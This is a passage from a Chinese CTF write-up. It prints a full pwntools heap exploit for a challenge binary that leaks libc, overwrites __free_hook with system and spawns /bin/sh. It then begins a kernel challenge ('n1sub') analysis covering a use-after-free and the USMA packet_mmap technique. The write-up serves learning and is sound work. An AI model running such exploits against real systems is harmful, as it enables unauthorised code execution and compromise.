class="number">0x100</span></span><br><span class="line">libc_base = leak_addr<span class="number">-0x1ecb00</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>最后劫持 tcache 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18DD)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">value_atom</span>(<span class="params">nelts, value:<span class="built_in">list</span>, key=<span class="number">0</span>, value2=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | key | value2 | nelts | value</span></span><br><span class="line">    value_data = <span class="string">b&quot;&quot;</span>.join([p32(i) <span class="keyword">for</span> i <span class="keyword">in</span> value])</span><br><span class="line">    tmp = p32(<span class="number">1</span>) + p32(key) + p32(value2) + p32(nelts) + value_data</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_atom</span>(<span class="params">nelts, <span class="built_in">type</span>:<span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | nelts | type</span></span><br><span class="line">    type_data = <span class="string">b&quot;&quot;</span>.join([p8(t) <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">type</span>])</span><br><span class="line">    tmp = p32(<span class="number">2</span>) + p32(nelts) + type_data</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name_atom</span>(<span class="params">name:<span class="built_in">bytes</span></span>):</span></span><br><span class="line">    <span class="comment"># len | type | name_len | name</span></span><br><span class="line">    tmp = p32(<span class="number">3</span>) + p32(<span class="built_in">len</span>(name)) + name</span><br><span class="line">    tmp = p32(<span class="number">4</span> + <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;cmd&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span>(<span class="params">data:<span class="built_in">bytes</span></span>):</span></span><br><span class="line">    <span class="comment"># data_len | 0 | data</span></span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&quot;atom&gt;&gt;&quot;</span>)</span><br><span class="line">    p.send(p32(<span class="built_in">len</span>(data)+<span class="number">8</span>))</span><br><span class="line">    p.send(p32(<span class="number">0</span>)+data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;name&gt;&gt;&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;name&gt;&gt;&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name,index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;name&gt;&gt;&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;Input Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Input New Val: &quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;1111\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>) + value_atom(<span class="number">0x100</span>, [<span class="number">0x1000</span>], <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;2222\x00&quot;</span>) + value_atom(<span class="number">0x100</span>, [<span class="number">0x1000</span>]*<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">b&quot;2222\x00&quot;</span>)</span><br><span class="line">show(<span class="string">b&quot;1111\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot; 0 0 1 2952790016 &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr1))</span><br><span class="line">leak_addr2 = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr2))</span><br><span class="line"></span><br><span class="line">leak_addr = (leak_addr2 &amp; <span class="number">0xff</span>)*<span class="number">0x10000000000</span>+leak_addr1*<span class="number">0x100</span></span><br><span class="line">heap_base = leak_addr-<span class="number">0x300</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot; 5 3758096384 &quot;</span>)</span><br><span class="line">leak_addr1 = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr1))</span><br><span class="line">leak_addr = (<span class="number">0x7f</span> &amp; <span class="number">0xff</span>)*<span class="number">0x10000000000</span>+leak_addr1*<span class="number">0x100</span></span><br><span class="line">libc_base = leak_addr-<span class="number">0x1ecb00</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;1\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;2\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;3\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">b&quot;1\x00&quot;</span>)</span><br><span class="line">dele(<span class="string">b&quot;2\x00&quot;</span>)</span><br><span class="line">dele(<span class="string">b&quot;3\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = (free_hook &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">edit(<span class="string">b&quot;1111\x00&quot;</span>,<span class="number">0x100</span>-<span class="number">2</span>,data)</span><br><span class="line">data = (free_hook &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">edit(<span class="string">b&quot;1111\x00&quot;</span>,<span class="number">0x100</span>-<span class="number">1</span>,data)</span><br><span class="line">data = (free_hook &amp; <span class="number">0xff</span>) * <span class="number">0x1000000</span></span><br><span class="line">edit(<span class="string">b&quot;1111\x00&quot;</span>,<span class="number">0x100</span>-<span class="number">3</span>,data)</span><br><span class="line"></span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(<span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">b&quot;;/bin/sh\x00&quot;</span>) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line">payload = type_atom(<span class="number">0x100</span>, [<span class="number">0</span>]*<span class="number">0x100</span>) + name_atom(p64(system)) + value_atom(<span class="number">1</span>, [<span class="number">0x1000</span>]*<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hash</span>(payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">b&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="n1sub"><a href="#n1sub" class="headerlink" title="n1sub"></a>n1sub</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">6.1</span><span class="number">.58</span> (chuj@pwn-host.nixos) (gcc (Ubuntu <span class="number">11.3</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">22.04</span><span class="number">.1</span>) <span class="number">11.3</span><span class="number">.0</span>, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.38</span>) #<span class="number">1</span> SMP PREEMPT_DYNAMIC Mon Oct <span class="number">16</span> <span class="number">12</span>:<span class="number">23</span>:<span class="number">54</span> CST <span class="number">2023</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &#x27;console=ttyS0 kaslr quiet loglevel=3 oops=panic panic=-1&#x27; \</span><br><span class="line">    -netdev user,id=net \</span><br><span class="line">    -device e1000,netdev=net \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -nographic -s</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">insmod /sub.ko</span><br><span class="line">chmod 666 /dev/n1sub</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>题目给了配置文件，有些内核保护并没有开启：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># CONFIG_MEMCG is <span class="keyword">not</span> <span class="built_in">set</span> <span class="comment">/* 关闭内存控制器(GFP_KERNEL和GFP_ACCOUNT之间没有隔离) */</span></span><br><span class="line"># CONFIG_SLAB_FREELIST_RANDOM is <span class="keyword">not</span> <span class="built_in">set</span> <span class="comment">/* 关闭slab freelist随机化 */</span></span><br><span class="line"># CONFIG_SLAB_FREELIST_HARDENED is <span class="keyword">not</span> <span class="built_in">set</span></span><br><span class="line"># CONFIG_SLUB_STATS is <span class="keyword">not</span> <span class="built_in">set</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0xDEADBEE1</span> )                      <span class="comment">// dele</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( arg &gt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  <span class="keyword">if</span> ( !bufs_free[arg] )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(bufs[arg]);</span><br><span class="line">    bufs_free[arg] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(&amp;ioctl_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>USMA 用户态映射攻击</strong></p>
<p>在 Linux 内核中的 packet socket 模块可以让用户在设备驱动层接受和发送 raw packets，并且为了加速数据报文的拷贝，它允许用户创建一块与内核态共享的环形缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN); </span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>pg_vec</code> 实际上是一个保存着连续物理页的虚拟地址的数组，而这些虚拟地址会被 <code>packet_mmap</code> 函数所使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_mmap</span><span class="params">(struct file *file, struct socket *sock,</span></span></span><br><span class="line"><span class="params"><span class="function">		struct vm_area_struct *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> size, expected_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line">	<span class="keyword">int</span> err = -EINVAL;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_pgoff)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line"></span><br><span class="line">	expected_size = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (rb-&gt;pg_vec) &#123;</span><br><span class="line">			expected_size += rb-&gt;pg_vec_len</span><br><span class="line">						* rb-&gt;pg_vec_pages</span><br><span class="line">						* PAGE_SIZE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (expected_size == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	size = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line">	<span class="keyword">if</span> (size != expected_size)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	start = vma-&gt;vm_start;</span><br><span class="line">	<span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (rb-&gt;pg_vec == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">			<span class="keyword">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line">			<span class="keyword">int</span> pg_num;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;</span><br><span class="line">				page = pgv_to_page(kaddr);</span><br><span class="line">				err = vm_insert_page(vma, start, page); <span class="comment">/* 将内存页插入到用户态的虚拟地址空间中 */</span></span><br><span class="line">				<span class="keyword">if</span> (unlikely(err))</span><br><span class="line">					<span class="keyword">goto</span> out;</span><br><span class="line">				start += PAGE_SIZE;</span><br><span class="line">				kaddr += PAGE_SIZE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	atomic_inc(&amp;po-&gt;mapped);</span><br><span class="line">	vma-&gt;vm_ops = &amp;packet_mmap_ops;</span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	mutex_unlock(&amp;po-&gt;pg_vec_lock);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
